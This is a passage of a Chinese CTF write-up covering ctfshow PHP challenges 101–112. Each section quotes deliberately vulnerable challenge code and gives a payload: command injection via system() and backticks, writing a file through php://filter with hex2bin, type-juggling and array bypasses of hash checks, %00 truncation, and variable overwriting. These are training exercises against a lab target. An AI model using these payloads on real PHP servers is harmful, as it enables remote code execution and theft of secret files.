class="keyword">print</span> (<span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="number">0</span>);     <span class="comment">//输出为0 ，在if语句中，只有全为真才为真</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Because <span class="string">&#x27;and/or&#x27;</span> have lower priority than <span class="string">&#x27;=&#x27;</span> but <span class="string">&#x27;||/&amp;&amp;&#x27;</span> have higher.</span><br></pre></td></tr></table></figure>
<p>所以只要保证v1是数字就可以使得v0为true，从而进入if中</p>
<p>payload:</p>
<blockquote>
<p>?v1=1&amp;v2=var_dump($ctfshow)/<em>&amp;v3=</em>/;<br>?v1=1&amp;v2=?&gt;<?php echo `ls`?>/<em>&amp;v3=;</em>/<br>?v1=1&amp;v2=-system(‘ls’)-&amp;v3=-1;<br>?v1=1&amp;v2=echo&amp;v3=;system(‘ls’);<br>?v1=1&amp;v2=var_dump(get_class_vars(&amp;v3=);</p>
</blockquote>
<p><strong>还有一种方法是通过发射类ReflectionClass，输出class ctfshow</strong></p>
<blockquote>
<p><strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p>
</blockquote>
<p>简单来说反射类就是存放了类里的所有东西。<br>最简单的方法直接输出这个类即可，也就是构造出 <code>echo new ReflectionClass(&#39;ctfshow&#39;);</code></p>
<p>payload:<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p>
<h2 id="web-102-103"><a href="#web-102-103" class="headerlink" title="web 102-103"></a>web 102-103</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>$v4为真执行，则$v2需要是数字。使用回调函数<code>call_user_func</code>，调用$v1的函数，将$s 作为参 数 ，将str写入v3参数</p>
<p>知识点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在php5x的环境下is_numeric可以识别十六进制，返回值为<span class="literal">true</span></span><br><span class="line">在php7x的环境下is_numeric不可以识别十六进制，返回值为<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;0x3c3f706870206576616c28245f504f53545b315d293b3f3e&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//返回值 bool(false)</span></span><br><span class="line"><span class="comment">//环境为php7</span></span><br></pre></td></tr></table></figure>
<p>题目环境为php7，所有不能使用十六进制编码绕过，</p>
<p>要让v2均为数字，首先我们考虑写入1.php时，利用伪协议写入恶意代码,同时让$v1为hex2bin (将十六进制转为ascii)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">get</span>:v<span class="number">2</span>=？？？&amp;v<span class="number">3</span>=php://filter/write=convert.base<span class="number">64</span>-decode/resource=<span class="number">1</span>.php</span><br><span class="line"><span class="attribute">post</span>: v<span class="number">1</span>=hex<span class="number">2</span>bin</span><br></pre></td></tr></table></figure>
<p>所以我们要考虑的就是如何让我们写入的恶意代码base64编码后，经16进制编码全为数字</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  <span class="regexp">//</span> PD89YGNhdCAqYDs=</span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);      <span class="regexp">//</span>等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的。</span><br><span class="line">输出   <span class="number">5044383959474</span>e6864434171594473</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>带e的话会被认为是科学计数法，可以通过is_numeric检测</span><br></pre></td></tr></table></figure>
<p>同时因为经过substr处理,从第三个字母开始取，所以v2前面还要补00<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:v2=<span class="number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure>
<p>写入成功后访问1.php，查看源码即可得到flag</p>
<h2 id="web-104"><a href="#web-104" class="headerlink" title="web 104"></a>web 104</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>类似md5碰撞</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="attribute">aaK1STfY</span></span><br><span class="line"><span class="attribute">0e76658526655756207688271159624026011393</span></span><br><span class="line"><span class="attribute">aaO8zKZF</span></span><br><span class="line"><span class="attribute">0e89257456677279068558073954252716165668</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload：</span></span><br><span class="line"><span class="attribute">GET</span>：v<span class="number">2</span>[]=<span class="number">1</span></span><br><span class="line"><span class="attribute">POST</span>: v<span class="number">1</span>[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="attribute">GET</span>:v<span class="number">2</span>=a</span><br><span class="line"><span class="attribute">POST</span>:va=a</span><br></pre></td></tr></table></figure>


<h2 id="web-105"><a href="#web-105" class="headerlink" title="web 105"></a>web 105</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先放payload:</p>
<p><img src="https://img.npfs06.top/20210308001645.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $<span class="variable">$key</span>=$<span class="variable">$value</span>;</span><br><span class="line"><span class="regexp">//</span>这是一步变量覆盖，我们传入suces=flag,最终会得到</span><br><span class="line"><span class="regexp">//</span><span class="variable">$suces</span>=<span class="variable">$flag</span>，就是说将flag赋值给了suces变量</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210308001702.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以看到在只有GET请求的时候，报的是error错误，这也就说明我们只要将flag赋值给error变量即可</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$</span><span class="variable">$key</span>=<span class="variable">$</span><span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line">//我们POST传入error=suces,最终得到<span class="variable">$error</span>=<span class="variable">$suces</span>,结合GET请求，推出<span class="variable">$error</span>=<span class="variable">$flag</span>，即成功将flag的值赋值给了error变量</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="web-106"><a href="#web-106" class="headerlink" title="web 106"></a>web 106</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<p>GET : v2[]=1</p>
<p>POST: v1[]=2</p>
<h2 id="web-107"><a href="#web-107" class="headerlink" title="web 107"></a>web 107</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点：</p>
<p><strong>parse_str函数的使用</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str — 将字符串解析成多个变量</span><br><span class="line"></span><br><span class="line">parse_str ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] ) : <span class="keyword">void</span></span><br><span class="line"></span><br><span class="line">如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line">parse_str(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> : v<span class="number">3</span>=flag</span><br><span class="line"><span class="attribute">POST</span>: v<span class="number">1</span>=flag=<span class="number">327</span>a<span class="number">6</span>c<span class="number">4304</span>ad<span class="number">5938</span>eaf<span class="number">0</span>efb<span class="number">6</span>cc<span class="number">3</span>e<span class="number">53</span>dc</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> : v<span class="number">3</span>=<span class="number">240610708</span>  //利用科学计数法绕过</span><br><span class="line"><span class="attribute">POST</span>: v<span class="number">1</span>=flag=<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点：</p>
<p><strong>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</strong></p>
<p>函数介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strrev()  字符串反转</span><br><span class="line">intval()  获取变量的整数值</span><br><span class="line"><span class="number">12</span></span><br><span class="line">payload:c=a%<span class="number">00778</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>c=a%00778</p>
</blockquote>
<p>正则表达式只会匹配%00之前的内容，后面的被截断掉，</p>
<p>通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。</p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点：</p>
<p>Exception 异常处理类 <a href="http://c.biancheng.net/view/6253.html">http://c.biancheng.net/view/6253.html</a> </p>
<p>php发射类ReflectionClass</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">payload</span>:</span><br><span class="line"><span class="variable">v1</span>=<span class="function"><span class="title">Exception</span>();<span class="title">system</span>(<span class="string">&#x27;cat /fl36dg.txt&#x27;</span>);<span class="comment">//&amp;v2=a</span></span></span><br><span class="line"><span class="function"><span class="variable">v1</span>=<span class="variable">ReflectionClass</span>&amp;<span class="variable">v2</span>=<span class="title">system</span>(<span class="string">&#x27;cat /fl36dg.txt&#x27;</span>)</span></span><br></pre></td></tr></table></figure>


<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点：<br>**php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 <a href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a> <a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> **</p>
<p><strong>getcwd()函数 获取当前工作目录 返回当前工作目录</strong></p>
<p>payload:</p>
<blockquote>
<p>v1=FilesystemIterator&amp;v2=getcwd</p>
<p>然后直接url访问flag文件即可</p>
</blockquote>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>知识点：<strong>GLOBALS</strong></p>
<blockquote>
<p>$GLOBALS — 引用全局作用域中可用的全部变量<br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
</blockquote>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">123</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">456</span>;</span><br><span class="line">var_dump(<span class="variable">$GLOBALS</span>);</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[<span class="string">&quot;a&quot;</span>]</span>=&gt;</span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">123</span>)</span></span></span><br><span class="line"><span class="selector-attr">[<span class="string">&quot;b&quot;</span>]</span>=&gt;</span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">456</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>只要把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出。又因为$v1要匹配到ctfshow</p>
<p>payload：</p>
<blockquote>
<p>?v1=ctfshow&amp;v2=GLOBALS</p>
</blockquote>
<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>is_file — 判断给定文件名是否为一个正常的文件<br>is_file ( string $filename ) : bool</p>
</blockquote>
<p>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件</p>
<p>直接用不带任何过滤器的filter伪协议</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file=php:<span class="regexp">//</span>filter/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>也可以用一些没有过滤掉的编码方式和转换方式</p>
<p>还有一些其他的，可以参考<a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">php文档</a></p>
<p><strong>payload:</strong></p>
